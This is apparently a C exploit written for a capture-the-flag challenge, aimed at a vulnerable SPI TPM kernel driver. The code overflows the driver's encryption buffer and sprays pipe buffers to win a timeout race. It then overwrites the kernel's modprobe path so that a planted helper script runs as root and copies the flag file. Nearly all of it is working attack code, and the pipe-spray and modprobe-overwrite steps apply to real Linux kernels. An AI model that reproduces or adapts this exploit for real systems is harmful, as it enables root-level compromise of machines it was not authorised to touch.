/* SPI TPM pwn CTF-only experiment; prepend raw_probe syscall helpers. */
static u8 flood[4096],sealed[4096],readback[512];
static int pipes[8][2];
static const char helper[]="/tmp/m";
static void put32(int n,u32 v){for(int i=0;i<4;i++)input[n+i]=v>>(8*i);}
static void put64(int n,u64 v){for(int i=0;i<8;i++)input[n+i]=v>>(8*i);}
static void readfile(const char *path){long f=call(56,-100,(long)path,0,0,0,0);if(f<0){logrow(-9,0,f,0,0,0);return;}long n=call(63,f,(long)readback,sizeof(readback)-1,0,0,0);if(n>0)call(64,1,(long)readback,n,0,0,0);call(57,f,0,0,0,0,0);}
int main(void){
 say("PWN_LOCAL_ATTEMPT\n");u64 mask=1;call(122,0,8,(long)&mask,0,0,0);
 const char script[]="#!/bin/sh\n/bin/cat /flag > /tmp/leak\n/bin/chmod 0644 /tmp/leak\n";
 long hf=call(56,-100,(long)helper,0x241,0755,0,0);if(hf<0){logrow(-8,0,hf,0,0,0);return 1;}call(64,hf,(long)script,sizeof(script)-1,0,0,0);call(57,hf,0,0,0,0,0);
 say("MODPROBE_BEFORE\n");readfile("/proc/sys/kernel/modprobe");
 int fd=call(56,-100,(long)"/dev/spi-tpm0",2,0,0,0);struct gen g;fill(&g,0,sizeof(g));long r=call(29,fd,0xc0184301UL,(long)&g,0,0,0);if(r||g.status)return 2;
 fill(input,0,1024);
 for(int idx=51;idx<=52;idx++){int off=idx*40-1088;put64(off,0x03ffffffc200ee00UL);put32(off+8,0xb0);put32(off+12,0);put64(off+16,0xffff800080231060UL);put32(off+24,0x10);}
 struct crypt enc;fill(&enc,0,sizeof(enc));enc.key=g.key;enc.cost=1;enc.inlen=1024;enc.cap=4096;enc.in=(u64)input;enc.out=(u64)sealed;
 r=call(29,fd,0xc0384302UL,(long)&enc,0,0,0);logrow(-1,0,r,enc.status,enc.outlen,0);if(r||enc.status||enc.outlen!=1064)return 3;
 for(int k=0;k<8;k++){
   long p=call(59,(long)pipes[k],0x800,0,0,0,0);long s=call(25,pipes[k][1],1031,524288,0,0,0);if(p||s!=524288){logrow(-2,k,p,s,0,0);return 4;}
   fill(flood,0x41+k,sizeof(flood));for(int j=0;j<53;j++)if(call(64,pipes[k][1],(long)flood,sizeof(flood),0,0,0)!=sizeof(flood))return 5;
 }
 say("PIPES_READY\n");volatile u32 *shared=(void*)call(222,0,4096,3,0x21,-1,0);if((long)shared<0)return 6;*shared=0;
 long child=call(220,17,0,0,0,0,0);
 if(!child){u64 m=2;call(122,0,8,(long)&m,0,0,0);fill(flood,'Z',sizeof(flood));long t[2]={0,10000000};call(101,(long)t,0,0,0,0,0);for(int i=0;i<4096 && !*shared;i++)call(64,1,(long)flood,sizeof(flood),0,0,0);call(94,0,0,0,0,0,0);}
 say("BACKPRESSURE_READY\n");
 for(int i=0;i<32;i++){
   struct crypt c;fill(&c,0,sizeof(c));c.inlen=enc.outlen;c.cap=4096;c.in=(u64)sealed;c.out=(u64)output;
   long start=now();r=call(29,fd,0xc0384303UL,(long)&c,0,0,0);long dt=now()-start;
   if(c.status==-110){
     *shared=1;long sizes[8];long t0=now();for(int k=0;k<8;k++)sizes[k]=call(25,pipes[k][1],1031,1048576,0,0,0);
     long spray=now()-t0;long t[2]={0,30000000};call(101,(long)t,0,0,0,0,0);logrow(0,i,r,c.status,c.outlen,dt);logrow(-3,0,0,0,0,spray);
     for(int k=0;k<8;k++){
       int avail=0;long q=call(29,pipes[k][0],0x541b,(long)&avail,0,0,0);logrow(-4,k,q,sizes[k],avail,0);
       if(q==0 && avail==51*4096){
         say("CONTROLLED_PIPE_RING\n");long wr=call(64,pipes[k][1],(long)helper,sizeof(helper),0,0,0);logrow(-5,k,wr,0,0,0);
         say("MODPROBE_AFTER\n");readfile("/proc/sys/kernel/modprobe");int disc=13;long tr=call(29,0,0x5423,(long)&disc,0,0,0);logrow(-6,0,tr,0,0,0);
         say("FLAG_RESULT_BEGIN\n");readfile("/tmp/leak");say("\nFLAG_RESULT_END\n");
       }
     }
     say("PROBE_COMPLETE\n");for(;;){long t[2]={1,0};call(101,(long)t,0,0,0,0,0);}
   }
 }
 *shared=1;say("NO_TIMEOUT\nPROBE_COMPLETE\n");return 0;
}
__attribute__((naked)) void _start(void){__asm__("mov x29,xzr\nmov x30,xzr\nbl main\nmov x8,#94\nsvc #0\nb .");}
